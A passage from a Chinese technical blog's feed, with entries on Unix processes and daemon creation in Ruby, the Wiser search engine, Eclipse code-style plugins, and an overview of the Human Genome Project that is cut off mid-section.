</table></figure><p>pipe返回一个包含两个元素的数组，第一个元素为reader的信息，第二个元素为writer的信息。</p><p>向管道写完信息就关闭writer，是因为reader调用read方法时，会不停地试图从管道中读取数据，直到读到一个EOF(文件结束标志)。这个标志告诉reader已经读完管道中所有的数据了。只要writer保持打开，那么reader就可能读到更多的数据，因此它就会一直等待。在读取之前关闭writer，将一个EOF放入管道中，这样一来，reader获得原始数据之后就会停止读取。要是忘记或者省去关闭writer这一步，那么reader就会被阻塞并不停地试图读取数据。</p><p>因为管道是单向的，所以再上诉程序中，reader只能读取，writer只能写入。</p><p>当某个进程衍生出一个子进程的时候，会与子进程共享打开的资源，管道也被认为是一种资源，它有自己的文件描述符等，因此可以与子进程共享。</p><p>当使用诸如管道或TCP套接字这样的IO流时，将数据写入流中，之后跟着一些特定协议的分隔符，随后从IO流中读取数据时，一次读取一块(chuck)，遇到分隔符就停止读取。</p><p>Unix套接字是一种只能用于在同一台物理主机中进行通信的套接字，它比TCP套接字快很多，非常适合用于IPC。</p><p>管道和套接字都是对进程间通信的有益抽象。它们即快速有简单，多被用作通信通道，来代替更为原始的方法，如共享数据库或日志文件。使用哪种方法取决于自己的需要，不过记得管道提供的是单向通信，套接字提供的是双向通信。</p><h2 id="终端进程">终端进程</h2><p>我们在终端执行每一条命令，其实都是创建了一个终端进程。</p><p>exec()系统调用非常简单，它允许使用另一个进程来替换当前进程，exec()这种转变是有去无回的，一旦你将当前进程转变为另外一个别的进程，那就再也变不回来了。</p><p>在要生成新进程的时候，fork()+exec()的组合是常见的一种用法，使用fork()创建一个新进程，然后用exec()把这个进程变成自己想要的进程，你的当前进程仍像从前一样运行，也仍可以根据需要生成其他进程。如果程序依赖于exec()调用的输出结果，可用wait方法来确保你的程序一直等到子进程完成它的工作，这样就可取回结果。exec()在默认情况下不会关闭任何打开的文件描述符或进行内存清理。</p><p>把字符串传递给exec实际上会启动一个shell进程，然后shell进程对这个字符串进行解释，传递一个数组的话，它会跳过shell，直接将此数组作为新进程的ARGV-参数数组，除非真的需要，一般尽可能地传递数组。</p><p>fork()是有成本的，记住这点有益无害，有时候它会成为性能瓶颈，主要是因为fork()的新子进程的两个独特属性：</p><ul>  <li>获得了一份父进程在内存中所有内容的副本；</li>  <li>获得了父进程已打开的所有文件描述符的副本。</li></ul><p>有一个系统调用posix_spawn，子保留了第2条，没有保留第1条。posix_spawn所生成的子进程可以访问父进程打开的所有文件描述符，却无法与父进程共享内存。这也是为什么posix_spawn比fork快、更有效率的原因。但事务都有两面性，也会因此而缺乏灵活性。</p><h2 id="守护进程">守护进程</h2><p>守护进程是在后台运行的进程，不受终端用户控制。Web服务器或数据库服务器都属于常见的守护进程，它们一直在后台运行响应请求。守护进程也是操作系统的核心功能，有很多进程一直在后台运行以保证系统的正常运行，任何进程都可变成守护进程。</p><p>当内核被引导时会产生一个叫做init的进程。该进程的pid是1，而ppid是0，作为所有进程的祖父。它是首个进程，没有祖先。一个孤儿进程会被init进程收养，孤儿进程的ppid始终是1，这是内核能够确保一直运行的唯一进程。</p><p>每一个进程都属于某个组，每一个组都有唯一的整数id，称为进程组id。进程组是一个相关进程的集合，通常是父进程与子进程。但是也可以按照需要将进程分组，可以通过setpgrp(new_group_ip)方法来设置进程组id。通常情况下，进程组id和进程组组长的id是相同的。进程组组长是终端命令的发起进程。也就是说，如果在终端启动一个进程，那么它就会成为一个新进程组的组长，它所创建的子进程就成为同一个进程组的组员。</p><p>这里进一步说明一下，之前讲过孤儿进程，子进程在父进程退出后会被init进程收养而继续运行，这是父进程退出的行为，但是如果父进程由终端控制并被信号终止的话，孤儿进程也会被终止的。这是因为父子进程属于同一个进程组，而父进程由终端控制，当父进程收到来自终端的终止信号时，与父进程属于同一个进程组的子进程也会收到终止信号而被终止。</p><p>会话组是更高一级的抽象，它是进程组的集合。一个会话组可以依附于一个终端，也可以不依附与任何终端，比如守护进程。终端用一种特殊的方法来处理会话组：发送给会话领导的信号会被转发到该会话中的所有进程组内，然后再转发到这些进程组中的所有进程。系统调用getsid()可用来检索当前的会话组id。</p><p>以下是创建一个守护进程的过程：</p><ul>  <li>首先在终端创建一个进程，并在进程中衍生出一个子进程，然后作为父进程的自己退出。启动该进程的终端察觉到进程退出后，将控制返回给用户，但是衍生出的子进程仍然拥有从父进程中继承而来的组id和会话组id，此时这个衍生进程既非会话领导也非进程组组长。因终端与衍生进程之间仍有牵连，如果终端发送信号到衍生进程的会话组，衍生进程会接收到这个信号，但我们想要的是完全脱离终端。</li>  <li>setsid方法可使得衍生进程成为一个新进程组的组长和新会话组的领导，而且此时新的会话组并没有控制终端。注意，如果在某个已经是进程组组长的进程中调用setsid方法，则会失败，它只能从子进程中调用。</li>  <li>已经成为进程组和会话组组长的衍生进程再次进行衍生，然后自己退出。新衍生出的进程不再是进程组和会话组组长，由于之前会话领导并没有相应的控制终端，且此进程也不是会话领导，因此该进程绝对不会有相应的控制终端存在，如此就可以确保进程现在是完全脱离了控制终端并且可以独立运行。</li>  <li>将进程的工作目录更改为系统的根目录，可避免进程的启动进程出于个各种问题被删除或者卸载。</li>  <li>将所有标准流重定向到“/dev/null”，也就是将其忽略，主要是因为守护进程已不再依附于某个终端会话，所以标准流也就无用了，但是不能简单的关闭，因为一些进程可能还指望它们随时可用。</li></ul><p>以下是ruby语言创建一个守护进程的完整程序：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>      </td>      <td class="code">        <pre><span class="line">exit if fork</span><br><span class="line">Process.setsid</span><br><span class="line">exit if fork</span><br><span class="line"></span><br><span class="line">Dir.chdir  &quot;/&quot;</span><br><span class="line">STDIN.reopen   &quot;/dev/null&quot;</span><br><span class="line">STDOUT.reopen   &quot;/dev/null&quot;, &quot;a&quot;</span><br><span class="line">STDERR.reopen  &quot;/dev/null&quot;, &quot;a&quot;</span><br></pre>      </td>    </tr>  </table></figure><p>对于是否需要创建一个守护进程，就应该问自己一个基本问题：这个进程是否需要一直保持响应？如果答案为否，那么你也许可以考虑定时任务或后台作业系统，如果答案是肯定的，那就去创建，不用犹豫。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/aeaab565/">http://home.meng.uno/articles/aeaab565/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      不知道你们有没有这样的疑惑，每次在看资料时遇到fork(2)，我都不理解，为什么fork()函数需要2做参数？还只能是2。

本篇博客在阅读了《Working with Unix Processes》之后总结而成。

回答疑问
首先，我就来解释一下之前留下的那个疑问，用过Mac或者Linux的同学都知道电脑中有很多man文件夹，我也不知道怎么回事，莫非是因为我是个man？后来我知道了，man是manpages的意思，中文译作“Unix手册页”，和我们现实中使用的手册一样，这个手册也是分节的，其中比较重要的几节：

 * 节1：一般命令
 * 节2：系统调用
 * 节3：C库函数
 * 节4：特
    
    </summary>
    
      <category term="Operation System" scheme="http://home.meng.uno/categories/Operation-System/"/>
    
    
      <category term="Unix" scheme="http://home.meng.uno/tags/Unix/"/>
    
      <category term="进程" scheme="http://home.meng.uno/tags/%E8%BF%9B%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>自制简单搜索引擎及Wiser的使用</title>
    <link href="http://home.meng.uno/articles/c49b2caf/"/>
    <id>http://home.meng.uno/articles/c49b2caf/</id>
    <published>2018-03-03T06:10:07.000Z</published>
    <updated>2020-12-02T02:10:39.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>  <p>自己开发一个搜索引擎，可能是每一个计算机爱好者的梦想，但是当我们看到网上开源搜索引擎那么庞大时，未免有点害怕。那么开发一个搜索引擎真的很难么？</p></blockquote><blockquote>  <p>本博文在阅读了《How to Develop a Search Engineer》之后，总结而成。</p></blockquote><blockquote>  <p>代码下载：<a href="http://www.meng.uno/codes/wiser.zip" target="_blank" rel="noopener">Wiser</a></p></blockquote><h1>搜索引擎简介</h1><p>搜索引擎（Search Engine）是指根据一定的策略、运用计算机技术从互联网上搜集信息，在对信息进行组织和处理后，为用户提供检索服务。在日常生活中，可以看到 Google 等 Web 检索网站，还有邮件检索和专利检索等各种应用程序。</p><h2 id="背景知识">背景知识</h2><p>在自己写一个搜索引擎之前，需要先了解基本的原理和概念。比如分词，倒排索引，排序算法（BM25、PageRank）等。</p><p>搜索引擎工作步骤分为这几步：</p><ul>  <li>爬虫模块 Crawler 在网页上抓取感兴趣的网页数据存储为 Cached pages</li>  <li>索引构造器 Indexer 对 Cached pages 处理生成倒排索引(Inverted Index)</li>  <li>对查询词 Query 在倒排索引中查找对应的文档 Document</li>  <li>计算 Query 和 Document 的关联度，返回给用户 TopK 个结果</li>  <li>根据用户点击 TopK 的行为去修正用户查询的 Query，形成反馈闭环。</li></ul><p>搜索引擎的四大组件：</p><ul>  <li>文档管理器(Document Manager)</li>  <li>索引构建器(Indexer)</li>  <li>索引管理器(Index Manager)</li>  <li>索引检索器(Index Searcher)</li></ul><p>组件关系图：</p><p><img src="http://www.meng.uno/images/se/1.png" alt=""></p><h1>Wiser使用</h1><h3 id="编译运行">编译运行</h3><p>下载好<code>wiser.zip</code>文件，并解压缩到相应位置，进入文件夹，运行<code>make wiser</code>，稍待片刻，即可完成编译。</p><p><img src="http://www.meng.uno/images/se/4.png" alt=""></p><h3 id="收集数据">收集数据</h3><p>在本次使用wiser的实验中，直接从<code>https://dumps.wikimedia.org/zhwiki/latest/</code>下载相应的<code>xml</code>文件即可（省去了实际的爬虫过程）。</p><p><strong>使用wiser存入sqlite使用命令：<code>wiser -x XXX.xml -m 100 wiki.db</code></strong></p><p><img src="http://www.meng.uno/images/se/2.png" alt=""></p><p>此时，我们已经将10条数据存入<code>.db</code>文件中了。</p><h3 id="构建倒排索引">构建倒排索引</h3><p>*在上一步已经完成。</p><h3 id="检索文档">检索文档</h3><p><strong>使用wiser搜索一个关键词使用命令：<code>wiser -q &quot;XXX&quot; wiki.db</code></strong></p><h3 id="排序并呈现">排序并呈现</h3><p><img src="http://www.meng.uno/images/se/3.png" alt=""></p><p>从截图中可见，score代表匹配指数，已经计算好，并返回给我们。</p><h1>Wiser代码剖析</h1><p>在此先简单的介绍各个主要的<code>.c</code>文件实现的功能：</p><ul>  <li><code>wiser.c</code>: 主程序，接收命令行输入，并相应的调用其他函数；</li>  <li><code>database.c</code>: 操作sqlite，包括增，查等功能；</li>  <li><code>search.c</code>: 全文检索，TF-IDF求相关度；</li>  <li><code>postings.c</code>: 倒排索引压缩与解压缩；</li>  <li><code>token.c</code>: 创建倒排索引，N-gram分词；</li>  <li><code>wikiload.c</code>: 加载wikipedia上下载的<code>xml</code>文件；</li>  <li><code>util.c</code>: 编码相关的杂项。</li></ul><p>其他详情，还请实际使用啊！</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/c49b2caf/">http://home.meng.uno/articles/c49b2caf/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      自己开发一个搜索引擎，可能是每一个计算机爱好者的梦想，但是当我们看到网上开源搜索引擎那么庞大时，未免有点害怕。那么开发一个搜索引擎真的很难么？

本博文在阅读了《How to Develop a Search Engineer》之后，总结而成。

代码下载：Wiser

搜索引擎简介
搜索引擎（Search Engine）是指根据一定的策略、运用计算机技术从互联网上搜集信息，在对信息进行组织和处理后，为用户提供检索服务。在日常生活中，可以看到 Google 等 Web 检索网站，还有邮件检索和专利检索等各种应用程序。

背景知识
在自己写一个搜索引擎之前，需要先了解基本的原理和概念。比如分词，
    
    </summary>
    
      <category term="Data Mining" scheme="http://home.meng.uno/categories/Data-Mining/"/>
    
    
      <category term="搜索引擎" scheme="http://home.meng.uno/tags/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/"/>
    
      <category term="Wiser" scheme="http://home.meng.uno/tags/Wiser/"/>
    
      <category term="倒排文件" scheme="http://home.meng.uno/tags/%E5%80%92%E6%8E%92%E6%96%87%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>Eclipse的阿里巴巴代码规范配置</title>
    <link href="http://home.meng.uno/articles/6e79ab7a/"/>
    <id>http://home.meng.uno/articles/6e79ab7a/</id>
    <published>2018-03-01T15:25:33.000Z</published>
    <updated>2020-12-02T01:40:16.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="插件安装">插件安装</h2><p>环境：JDK1.8，Eclipse4+。有同学遇到过这样的情况，安装插件重启后，发现没有对应的菜单项，从日志上也看不到相关的异常信息，最后把JDK从1.6升级到1.8解决问题。</p><p>Help -&gt; Install New Software…</p><p><img src="https://gw.alicdn.com/tfscom/TB1LOyPifJNTKJjSspoXXc6mpXa.png" alt=""></p><p>输入Update Site地址：<a href="https://p3c.alibaba.com/plugin/eclipse/update" target="_blank" rel="noopener">https://p3c.alibaba.com/plugin/eclipse/update</a> 回车，然后勾选Ali-CodeAnalysis，再一直点Next Next…按提示走下去就好。 然后就是提示重启了，安装完毕。</p><p><img src="https://gw.alicdn.com/tfscom/TB1Ud5kifBNTKJjSszcXXbO2VXa.png" alt=""></p><p>注意：有同学反映插件扫描会触发很多 “JPA Java Change Event Handler (Waiting)” 的任务，这个是Eclipse的一个<a href="https://bugs.eclipse.org/bugs/show_bug.cgi?id=387455" target="_blank" rel="noopener">bug</a>，因为插件在扫描的时候会对文件进行标记，所以触发了JPA的任务。卸载JPA插件，或者尝试升级到最新版的Eclipse。附：<a href="https://my.oschina.net/cimu/blog/278724" target="_blank" rel="noopener">JPA project Change Event Handler问题解决</a></p><h2 id="插件使用">插件使用</h2><p>目前插件实现了开发手册中的53条规则，大部分基于PMD实现，其中有4条规则基于Eclipse实现，支持4条规则的QuickFix功能。</p><pre><code>* 所有的覆写方法，必须加@Override注解， * if/for/while/switch/do等保留字与左右括号之间都必须加空格,* long或者Long初始赋值时，必须使用大写的L，不能是小写的l）* Object的equals方法容易抛空指针异常，应使用常量或确定有值的对象来调用equals。</code></pre><p>目前不支持代码实时检测，需要手动触发，希望更多的人加入进来一起把咱们的插件做得越来越好，尽量提升研发的使用体验。</p><h3 id="代码扫描">代码扫描</h3><p>可以通过右键菜单、Toolbar按钮两种方式手动触发代码检测。同时结果面板中可以对部分实现了QuickFix功能的规则进行快速修复。</p><h4 id="触发扫描">触发扫描</h4><p>在当前编辑的文件中点击右键，可以在弹出的菜单中触发对该文件的检测。</p><p><img src="https://gw.alicdn.com/tfscom/TB1XGo8iPihSKJjy0FeXXbJtpXa.png" alt=""></p><p>在左侧的Project目录树种点击右键，可以触发对整个工程或者选择的某个目录、文件进行检测。</p><p><img src="https://gw.alicdn.com/tfscom/TB18UsJi2NZWeJjSZFpXXXjBFXa.png" alt=""></p><p>也可以通过Toolbar中的按钮来触发检测，目前Toolbar的按钮触发的检测范围与您IDE当时的焦点有关，如当前编辑的文件或者是Project目录树选中的项，是不是感觉与右键菜单的检测范围类似呢。</p><p><img src="https://gw.alicdn.com/tfscom/TB1vt1oifBNTKJjSszcXXbO2VXa.png" alt=""></p><h4 id="扫描结果">扫描结果</h4><p>简洁的结果面板，按规则等级分类，等级-&gt;规则-&gt;文件-&gt;违规项。同时还提供一个查看规则详情的界面。</p><p>清除结果标记更方便，支持上面提到的4条规则QuickFix。</p><p><img src="https://gw.alicdn.com/tfscom/TB1_uFJi6ihSKJjy0FlXXadEXXa.png" alt=""></p><h4 id="查看所有规则">查看所有规则</h4><p><img src="https://gw.alicdn.com/tfscom/TB1UNTnmYsTMeJjSszhXXcGCFXa.png" alt="">  <img src="https://gw.alicdn.com/tfscom/TB1_rf7sOAKL1JjSZFoXXagCFXa.png" alt=""></p><h4 id="国际化">国际化</h4><p><img src="https://gw.alicdn.com/tfscom/TB1KsyYsiFTMKJjSZFAXXckJpXa.png" alt=""></p><p><img src="https://gw.alicdn.com/tfscom/TB19bzdm3oQMeJjy1XaXXcSsFXa.png" alt=""></p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/6e79ab7a/">http://home.meng.uno/articles/6e79ab7a/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      插件安装
环境：JDK1.8，Eclipse4+。有同学遇到过这样的情况，安装插件重启后，发现没有对应的菜单项，从日志上也看不到相关的异常信息，最后把JDK从1.6升级到1.8解决问题。

Help -&gt; Install New Software…



输入Update Site地址：https://p3c.alibaba.com/plugin/eclipse/update 回车，然后勾选Ali-CodeAnalysis，再一直点Next Next…按提示走下去就好。 然后就是提示重启了，安装完毕。



注意：有同学反映插件扫描会触发很多 “JPA Java Change Event Ha
    
    </summary>
    
      <category term="Programming Language" scheme="http://home.meng.uno/categories/Programming-Language/"/>
    
    
      <category term="代码规范" scheme="http://home.meng.uno/tags/%E4%BB%A3%E7%A0%81%E8%A7%84%E8%8C%83/"/>
    
      <category term="Alibaba Format" scheme="http://home.meng.uno/tags/Alibaba-Format/"/>
    
      <category term="Eclipse" scheme="http://home.meng.uno/tags/Eclipse/"/>
    
  </entry>
  
  <entry>
    <title>Eclipse的Google样式Java代码自动规范配置</title>
    <link href="http://home.meng.uno/articles/548d5dfd/"/>
    <id>http://home.meng.uno/articles/548d5dfd/</id>
    <published>2018-03-01T12:59:33.000Z</published>
    <updated>2020-12-02T01:47:39.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>  <p>不知道大家在用Eclipse的时候有没有感觉到，当代码量一大就看不懂自己代码了呢？有人可能要说了，eclipse不是自己带有格式化代码工具吗？确实如此，但是我们可能想使用更高级的自动化工具，例如Google—Java-Style。这篇博文，我将展示如何使用eclipse自带的自动化代码规范工具，以及怎么配置Google-Java-Style。</p></blockquote><h1>准备</h1><p>文件下载：</p><ul>  <li>Eclipse: <a href="http://www.eclipse.org/" target="_blank" rel="noopener">进入官网</a></li>  <li>Google Java Format File: <a href="http://meng.uno/utils/eclipse-java-google-style.xml" target="_blank" rel="noopener">点击下载</a></li></ul><h1>使用Eclipse自带</h1><ul>  <li>快捷键： <code>Ctrl/Command + Shift + F</code></li>  <li>鼠标：    <ul>      <li>单个文件：进入文件/对着文件名<code>点右键</code> &gt; 找到<code>Source</code> &gt; 点击<code>Format</code> (其实就是快捷键的作用！)</li>      <li>项目：对着项目名/包名<code>点右键</code> &gt; 找到<code>Source</code> &gt; 点击<code>Format</code></li>    </ul>  </li></ul><p>如下截图：</p><p><img src="http://www.meng.uno/images/format/3.png" alt="右键"></p><h1>更换成Google Style</h1><p>当我们下载了本博客提供的<code>eclipse-java-google-style.xml</code>，就可以开始为formatter改风格了。</p><ul>  <li>打开eclipse的<code>Preferences</code>找到<code>Java</code>，再展开<code>Code Style</code>，找到<code>Formatter</code>。</li></ul><p><img src="http://www.meng.uno/images/format/1.jpg" alt="Code Style"></p><p>点击<code>Import</code>，在弹出窗口里选择我们下载的文件，确定即可。</p><p><img src="http://www.meng.uno/images/format/2.jpg" alt="Code Style"></p><p>再次进入项目，对着想要格式化的对象进行格式化操作，在进度条走完，我们就得到一份Google Java Style的代码了。</p><h1>后记</h1><ul>  <li>按照相似的步骤，我们也可以<code>Import</code>其他风格的代码规范；</li>  <li>Google不仅提供了eclipse上Java的代码规范，还有其他很多规范，详见<a href="https://github.com/google/styleguide" target="_blank" rel="noopener">Goole Style Guile</a></li>  <li>如果任何代码规范都不和心意，也可以打开某个代码规范，自己做相应的改动。</li></ul><p><img src="http://www.meng.uno/images/format/4.png" alt="Code Style"></p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/548d5dfd/">http://home.meng.uno/articles/548d5dfd/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      不知道大家在用Eclipse的时候有没有感觉到，当代码量一大就看不懂自己代码了呢？有人可能要说了，eclipse不是自己带有格式化代码工具吗？确实如此，但是我们可能想使用更高级的自动化工具，例如Google—Java-Style。这篇博文，我将展示如何使用eclipse自带的自动化代码规范工具，以及怎么配置Google-Java-Style。

准备
文件下载：

 * Eclipse: 进入官网
 * Google Java Format File: 点击下载

使用Eclipse自带
 * 快捷键： Ctrl/Command + Shift + F
 * 鼠标：  * 单个文件：进入文件/
    
    </summary>
    
      <category term="Software Engineering" scheme="http://home.meng.uno/categories/Software-Engineering/"/>
    
    
      <category term="代码规范" scheme="http://home.meng.uno/tags/%E4%BB%A3%E7%A0%81%E8%A7%84%E8%8C%83/"/>
    
      <category term="Eclipse" scheme="http://home.meng.uno/tags/Eclipse/"/>
    
      <category term="Google Format" scheme="http://home.meng.uno/tags/Google-Format/"/>
    
  </entry>
  
  <entry>
    <title>What are Human Genome Project and ENCODE Project?</title>
    <link href="http://home.meng.uno/articles/32469d52/"/>
    <id>http://home.meng.uno/articles/32469d52/</id>
    <published>2018-02-18T11:54:31.000Z</published>
    <updated>2020-12-02T01:46:56.000Z</updated>
    
    <content type="html"><![CDATA[<h1>Human Genome Project</h1><h2 id="the-profile-of-the-project">The Profile of the Project</h2><p>人类基因组计划(Human Genome Project,简称HGP)是由美国科学家于1985年率先提出，又于1990年正式启动的。来自美国、英国、法国、德国、日本和中国科学家共同参与了这一预算达30亿美元的人类基因组计划。按照这个计划的设想，在2005年，要把人体内约10万个基因的密码全部解开，同时绘制出人类基因的谱图。换句话说，就是要揭开组成人体4万个基因的30亿个碱基对的秘密。</p><p>这一计划的最终目的是测定人类基因组30亿个基本化学组成（称为碱基对或核苷酸），进而揭开与人类的生老病死有关的数万个基因的相互关系。1984年，美国能源部开会，开始酝酿“人类基因组计划”。1989年，美国能源部和美国国家卫生研究所提出了人类基因图谱工程。美国在1990年10月1日率先启动人类基因组计划。美国人类基因组顾问委员会委员梅纳德•奥尔森是人类基因组计划最早的推动者之一，另外美国一个测序中心的主任罗伯特•沃特斯顿以及英国的人类基因组总负责人均表示支持。美国完成人类基因组计划近54%的工作量，为人类基因组计划最大的贡献国。英国是人类基因组计划的第二大贡献国，共34%的贡献都是由Wellcome基金会资助的Sanger中心完成的。日本、法国、德国对人类基因组计划的贡献分别为6.8%、2.8%与2.2%。中国承担了3号染色体区域短臂端粒侧约30  cM，约占人类整个基因组1% 的测序工作。中国的华大基因、国家自然科学基金会、中科院遗传所南方基因中心、北方人类基因组中心等单位及于军、杨焕明、汪建、刘斯奇、吴旻、强伯勤、陈竺等也给予人类基因组计划大力的推动。</p><h2 id="the-importance-of-the-project">The Importance of the Project</h2><h3 id="目的">目的</h3><p>人类是在“进化”历程上最高级的生物，对人类基因的研究有助于认识自身、掌握生老病死规律、疾病的诊断和治疗、了解生命的起源。 测出人类基因组DNA的30亿个碱基对的序列，发现所有人类基因，找出它们在染色体上的位置，破译人类全部遗传信息。</p><p>在人类基因组计划中，还包括对五种生物基因组的研究：大肠杆菌、酵母、线虫、果蝇和小鼠，称之为人类的五种“模式生物”。</p><p>HGP的目的是解码生命、了解生命的起源、了解生命体生长发育的规律、认识种属之间和个体之间存在差异的起因、认识疾病产生的机制以及长寿与衰老等生命现象、为疾病的诊治提供科学依据。</p><h3 id="意义">意义</h3><p>人类基因组计划是一项规模宏大，跨国跨学科的科学探索工程。其宗旨在于测定组成人类染色体(指单倍体)中所包含的30亿个碱基对组成的核苷酸序列，从而绘制人类基因组图谱，并且辨识其载有的基因及其序列，达到破译人类遗传信息的最终目的。基因组计划是人类为了探索自身的奥秘所迈出的重要一步。</p><p>“人类基因组计划”与”曼哈顿原子弹计划”和”阿波罗计划”并称为二十世纪三大科学计划。</p><h2 id="the-achievement-of-the-project">The Achievement of the Project</h2><p>2000年6月26日，美国总统克林顿与英国首相布莱尔共同宣布人类基因组计划工作草图完成；次年2月，工作草图的具体序列信息、测序所采用的方法以及序列的分析结果被国际人类基因组测序联盟和塞雷拉基因组的科学家分别公开发表于《自然》与《科学》杂志。这一工作草图覆盖了基因组序列的83％，包括常染色质区域的90％（带有150,000个空缺，且许多片断的顺序和方位并没有得到确定）。</p><p>2001年2月12日，美国Celera公司与人类基因组计划分别在《科学》和《自然》杂志上公布了人类基因组精细图谱及其初步分析结果。</p><p>2003年，发现了新的方法通过检测另外的库来关闭Gaps。使用FISH技术或其他方法来分析没有闭合的Gaps大小。22，21条染色体就是用这种方式。</p><p>1999年至2006年，完成了全部23条染色体的测序工作，具体如下：</p><p>1999年12月，22号染色体测序完成；</p><p>2000年5月，21号染色体测序完成；</p><p>2001年12月，20号染色体测序完成；</p><p>2003年2月，14号染色体测序完成；</p><p>2003年6月，男性特有的Y染色体测序完成；</p><p>2003年5月和7月，7号染色体测序完成；</p><p>2003年10月，6号染色体测序完成；</p><p>2004年4月，13号和19号染色体测序完成；</p><p>2004年5月，9号和10号染色体测序完成；</p><p>2004年9月，5号染色体测序完成；</p><p>2004年12月，16号染色体测序完成；</p><p>2005年3月，X染色体测序完成；</p><p>2005年4月，2号和4号染色体测序完成；</p><p>2005年9月，18号染色体测序完成；</p><p>2006年1月，8号染色体测序完成；</p><p>2006年3月，11号,12号和15号染色体测序完成；</p><p>2006年4月，17号和3号染色体测序完成；Human Genome Project Information</p><p>2006年5月，1号染色体测序完成；Human Genome Project Information</p><p>2004年，国际人类基因组测序联盟的研究者宣布，人类基因组中所含基因的预计数目从先前的30,000至40,000（在计划初期的预计数目则高达2,000,000）调整为20,000至25,000。预期还需要多年的时间来确定人类基因组中所含基因的精确数目。</p><p>截止到2005年，人类基因组计划的测序工作已经完成。</p><h2 id="the-research-contents-of-the-project">The Research Contents of the Project</h2><h3 id="遗传图谱">遗传图谱</h3><p>遗传图谱又称连锁图谱（linkage map），它是以具有遗传多态性（在一个遗传位点上具有一个以上的等位基因，在群体中的出现频率皆高于1%）的遗传标记为“路标”，以遗传学距离（在减数分裂事件中两个位点之间进行交换、重组的百分率，1%的重组率称为1cM）为图距的基因组图。遗传图谱的建立为基因识别和完成基因定位创造了条件。意义：6000多个遗传标记已经能够把人的基因组分成6000多个区域，使得连锁分析法可以找到某一致病的或表现型的基因与某一标记邻近（紧密连锁）的证据，这样可把这一基因定位于这一已知区域，再对基因进行分离和研究。对于疾病而言，找基因和分析基因是个关键。</p><h3 id="物理图谱">物理图谱</h3><p>物理图谱是指有关构成基因组的全部基因的排列和间距的信息，它是通过对构成基因组的DNA分子进行测定而绘制的。绘制物理图谱的目的是把有关基因的遗传信息及其在每条染色体上的相对位置线性而系统地排列出来。DNA物理图谱是指DNA链的限制性酶切片段的排列顺序，即酶切片段在DNA链上的定位。因限制性内切酶在DNA链上的切口是以特异序列为基础的，核苷酸序列不同的DNA，经酶切后就会产生不同长度的DNA片段，由此而构成独特的酶切图谱。因此，DNA物理图谱是DNA分子结构的特征之一。DNA是很大的分子，由限制酶产生的用于测序反应的DNA片段只是其中的极小部分，这些片段在DNA链中所处的位置关系是应该首先解决的问题，故DNA物理图谱是顺序测定的基础，也可理解为指导DNA测序的蓝图。广义地说，DNA测序从物理图谱制作开始，它是测序工作的第一步。制作DNA物理图谱的方法有多种，这里选择一种常用的简便方法──标记片段的部分酶解法，来说明图谱制作原理。</p><h3 id="序列图谱">序列图谱</h3><p>随着遗传图谱和物理图谱的完成，测序就成为重中之重的工作。DNA序列分析技术是一个包括制备DNA片段化及碱基分析、DNA信息翻译的多阶段的过程。通过测序得到基因组的序列图谱。</p><h3 id="基因图谱">基因图谱</h3><h4 id="简介">简介</h4><p>基因图谱是在识别基因组所包含的蛋白质编码序列的基础上绘制的结合有关基因序列、位置及表达模式等信息的图谱。在人类基因组中鉴别出占具2%~5%长度的全部基因的位置、结构与功能，最主要的方法是通过基因的表达产物mRNA反追到染色体的位置。</p><h4 id="意义-v2">意义</h4><p>它能有效地反应在正常或受控条件中表达的全基因的时空图。通过这张图可以了解某一基因在不同时间不同组织、不同水平的表达；也可以了解一种组织中不同时间、不同基因中不同水平的表达，还可以了解某一特定时间、不同组织中的不同基因不同水平的表达。人类基因组是一个国际合作项目：表征人类基因组，选择的模式生物的DNA测序和作图，发展基因组研究的新技术，完善人类基因组研究涉及的伦理、法律和社会问题，培训能利用HGP发展起来的这些技术和资源进行生物学研究的科学家，促进人类健康。</p><h2 id="the-contributions-of-the-project">The Contributions of the Project</h2><h3 id="对人类疾病的贡献">对人类疾病的贡献</h3><p>人类疾病相关的基因是人类基因组中结构和功能完整性至关重要的信息。对于单基因病，采用“定位克隆”和“定位候选克隆”的全新思路，导致了亨廷顿氏舞蹈症、遗传性结肠癌和乳腺癌等一大批单基因遗传病致病基因的发现，为这些疾病的基因诊断和基因治疗奠定了基础。对于心血管疾病、肿瘤、糖尿病、神经精神类疾病（老年性痴呆、精神分裂症）、自身免疫性疾病等多基因疾病是疾病基因研究的重点。健康相关研究是HGP的重要组成部分，1997年相继提出：“肿瘤基因组解剖计划”“环境基因组学计划”。</p><h3 id="对医学的贡献">对医学的贡献</h3><p>基因诊断、基因治疗和基于基因组知识的治疗、基于基因组信息的疾病预防、疾病易感基因的识别、风险人群生活方式、环境因子的干预。</p><h3 id="对生物技术的贡献">对生物技术的贡献</h3><h4 id="基因工程药物">基因工程药物</h4><p>分泌蛋白（多肽激素，生长因子，趋化因子，凝血和抗凝血因子等）及其受体。</p><h4 id="诊断和研究试剂">诊断和研究试剂</h4><p>基因和抗体试剂盒、诊断和研究用生物芯片、疾病和筛药模型。</p><h4 id="细胞工程">细胞工程</h4><p>胚胎和成年期干细胞、克隆技术、器官再造技术。</p><h2 id="the-project-with-china">The Project with 